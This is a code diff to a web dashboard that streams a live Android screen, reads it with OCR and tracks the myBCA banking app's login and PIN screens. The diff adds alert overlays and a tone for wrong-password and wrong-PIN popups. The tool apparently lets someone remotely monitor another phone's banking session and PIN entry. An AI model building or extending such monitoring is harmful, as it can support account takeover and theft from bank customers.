@@ -372,6 +372,25 @@ tr:last-child td{border-bottom:0}
     position:absolute;left:-2px;top:-25px;padding:4px 7px;border-radius:5px;
     background:#29d391;color:#06110c;font-size:9px;font-weight:800;white-space:nowrap;
 }
+.mybca-alert{
+    position:absolute;inset:0;display:none;z-index:50;pointer-events:none;
+    align-items:center;justify-content:center;padding:22px;
+    background:rgba(70,0,0,.28);backdrop-filter:blur(2px);
+}
+.mybca-alert.show{display:flex;animation:myBcaAlertFlash .22s ease-out both}
+.mybca-alert-card{
+    width:min(430px,90%);padding:22px 20px;border:2px solid #ff3b4f;border-radius:16px;
+    background:linear-gradient(180deg,#2a0d12,#16090c);
+    box-shadow:0 0 0 5px #ff3b4f22,0 0 40px #ff3b4f66;
+    text-align:center;animation:myBcaAlertPulse .9s ease-in-out infinite alternate;
+}
+.mybca-alert-icon{font-size:34px;line-height:1;margin-bottom:10px}
+.mybca-alert-title{font-size:18px;font-weight:900;color:#fff;letter-spacing:.3px}
+.mybca-alert-text{font-size:12px;color:#ffb9c0;margin-top:7px;line-height:1.5}
+.mybca-alert-state{display:inline-block;margin-top:12px;padding:5px 9px;border-radius:999px;background:#ff3b4f;color:#fff;font-size:10px;font-weight:800}
+.mybca-helper-card.alerting{border-color:#ff3b4f;box-shadow:0 0 0 2px #ff3b4f18,0 0 22px #ff3b4f22}
+@keyframes myBcaAlertFlash{0%{opacity:0;transform:scale(.96)}100%{opacity:1;transform:scale(1)}}
+@keyframes myBcaAlertPulse{from{transform:scale(1)}to{transform:scale(1.018)}}
 @media(max-width:700px){.mybca-helper-grid{grid-template-columns:1fr}.mybca-helper-head{align-items:flex-start;flex-direction:column}}
 </style>
 <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
@@ -558,6 +577,14 @@ tr:last-child td{border-bottom:0}
                 aria-label="Live Android screen"
             ></video>
             <div class="viewer-message" id="viewerMessage">Membuka koneksi WebRTC...<br><br>Live screen akan muncul di sini.</div>
+            <div class="mybca-alert" id="mybcaAlert" aria-live="assertive">
+                <div class="mybca-alert-card">
+                    <div class="mybca-alert-icon">⚠️</div>
+                    <div class="mybca-alert-title" id="mybcaAlertTitle">PERINGATAN KERAS</div>
+                    <div class="mybca-alert-text" id="mybcaAlertText">Terjadi kesalahan pada proses myBCA.</div>
+                    <div class="mybca-alert-state" id="mybcaAlertState">MYBCA</div>
+                </div>
+            </div>
         </div>
         <div class="mybca-helper-card" id="mybcaHelperCard">
             <div class="mybca-helper-head">
@@ -618,14 +645,18 @@ const myBcaDetector = {
     timer: null,
     lastOcrText: "",
     pendingSecureState: null,
-    lastTapAt: 0
+    lastTapAt: 0,
+    activeError: null,
+    errorBaseState: null
 };
 
 const MYBCA_STATES = Object.freeze({
     HOME: "HOME MYBCA",
     LOGIN: "LOGIN MYBCA",
+    LOGIN_ERROR: "LOGIN_ERROR MYBCA",
     CONFIRMATION: "CONFIRMATION MYBCA",
-    PIN_VERIFICATION: "PIN_VERIFICATION MYBCA"
+    PIN_VERIFICATION: "PIN_VERIFICATION MYBCA",
+    PIN_ERROR: "PIN_ERROR MYBCA"
 });
 
 let categoryContextActive = false;
@@ -3085,6 +3116,79 @@ async function startCategoryPhoneStream(deviceId, isReconnect = false) {
 // =====================================================
 // MYBCA HELPER DETECTOR
 // =====================================================
+function showMyBcaAlert(kind, message) {
+    const overlay = document.getElementById("mybcaAlert");
+    const title = document.getElementById("mybcaAlertTitle");
+    const text = document.getElementById("mybcaAlertText");
+    const state = document.getElementById("mybcaAlertState");
+    const card = document.getElementById("mybcaHelperCard");
+    if (!overlay) return;
+
+    const isPin = kind === "PIN";
+    myBcaDetector.activeError = kind;
+    myBcaDetector.errorBaseState = isPin
+        ? MYBCA_STATES.PIN_VERIFICATION
+        : MYBCA_STATES.LOGIN;
+
+    myBcaDetector.bank = "MYBCA";
+    myBcaDetector.state = isPin
+        ? MYBCA_STATES.PIN_ERROR
+        : MYBCA_STATES.LOGIN_ERROR;
+
+    if (title) title.textContent = isPin
+        ? "PIN TRANSAKSI SALAH"
+        : "PASSWORD SALAH";
+    if (text) text.textContent = message || (isPin
+        ? "PIN Transaksi salah. Periksa kembali sebelum mencoba lagi."
+        : "BCA ID/Password salah. Periksa kembali sebelum mencoba lagi.");
+    if (state) state.textContent = isPin ? "PIN_ERROR MYBCA" : "LOGIN_ERROR MYBCA";
+
+    overlay.classList.remove("show");
+    void overlay.offsetWidth;
+    overlay.classList.add("show");
+    if (card) card.classList.add("alerting");
+    updateMyBcaHelperUI(isPin
+        ? "⚠ PIN Transaksi salah — menunggu tombol OK."
+        : "⚠ BCA ID/Password salah — menunggu tombol OK.");
+
+    // Optional short browser alert tone. It is best-effort and may be blocked by autoplay policy.
+    try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        if (AudioCtx) {
+            const ctx = new AudioCtx();
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+            osc.type = "sawtooth";
+            osc.frequency.value = isPin ? 620 : 520;
+            gain.gain.setValueAtTime(0.0001, ctx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.055, ctx.currentTime + 0.02);
+            gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.28);
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+            osc.start();
+            osc.stop(ctx.currentTime + 0.3);
+            setTimeout(() => ctx.close().catch(() => {}), 450);
+        }
+    } catch (_) {}
+}
+
+function clearMyBcaAlert(restoreState = true) {
+    const overlay = document.getElementById("mybcaAlert");
+    const card = document.getElementById("mybcaHelperCard");
+    if (overlay) overlay.classList.remove("show");
+    if (card) card.classList.remove("alerting");
+
+    const baseState = myBcaDetector.errorBaseState;
+    const hadError = myBcaDetector.activeError;
+    myBcaDetector.activeError = null;
+    myBcaDetector.errorBaseState = null;
+
+    if (restoreState && hadError && baseState) {
+        setMyBcaState(baseState, 0.9,
+            "Peringatan ditutup; kembali ke halaman input myBCA.");
+    }
+}
+
 function updateMyBcaHelperUI(message = null) {
     const bankEl = document.getElementById("mybcaDetectedBank");
     const stateEl = document.getElementById("mybcaDetectedState");
@@ -3115,11 +3219,14 @@ function setMyBcaState(state, confidence = 0.8, reason = "") {
 }
 
 function resetMyBcaDetector() {
+    clearMyBcaAlert(false);
     myBcaDetector.bank = null;
     myBcaDetector.state = null;
     myBcaDetector.confidence = 0;
     myBcaDetector.lastOcrText = "";
     myBcaDetector.pendingSecureState = null;
+    myBcaDetector.activeError = null;
+    myBcaDetector.errorBaseState = null;
     updateMyBcaHelperUI("Detector di-reset.");
 }
 
@@ -3139,6 +3246,29 @@ function myBcaHas(text, phrase) {
 function detectMyBcaFromOcr(rawText) {
     const text = normalizeOcrText(rawText);
     myBcaDetector.lastOcrText = text;
+
+    // Error dialogs are checked first because they are more specific than the underlying page.
+    if (myBcaHas(text, "BCA ID/Password salah") ||
+        (myBcaHas(text, "Password salah") && myBcaHas(text, "OK"))) {
+        showMyBcaAlert("LOGIN", "BCA ID/Password salah. Periksa kembali sebelum mencoba lagi.");
+        return MYBCA_STATES.LOGIN_ERROR;
+    }
+
+    if (myBcaHas(text, "PIN Transaksi salah") ||
+        (myBcaHas(text, "PIN") && myBcaHas(text, "salah") && myBcaHas(text, "OK"))) {
+        showMyBcaAlert("PIN", "PIN Transaksi salah. Periksa kembali sebelum mencoba lagi.");
+        return MYBCA_STATES.PIN_ERROR;
+    }
+
+    // If the popup disappeared after the user pressed OK, restore the underlying input state.
+    if (myBcaDetector.activeError) {
+        const base = myBcaDetector.errorBaseState;
+        if (base) {
+            clearMyBcaAlert(false);
+            setMyBcaState(base, 0.9, "Popup error sudah hilang; kembali ke halaman input.");
+            return base;
+        }
+    }
 
     // PIN screen: this is intentionally checked first because it is the most specific.
     if (myBcaHas(text, "PIN Transaksi") || (myBcaHas(text, "Verifikasi") && myBcaHas(text, "Silakan masukkan PIN"))) {
@@ -3251,6 +3381,7 @@ function startMyBcaDetector() {
 
 function stopMyBcaDetector() {
     myBcaDetector.running = false;
+    clearMyBcaAlert(false);
     stopMyBcaBlackFrameWatcher();
     if (myBcaDetector.timer) {
         clearTimeout(myBcaDetector.timer);
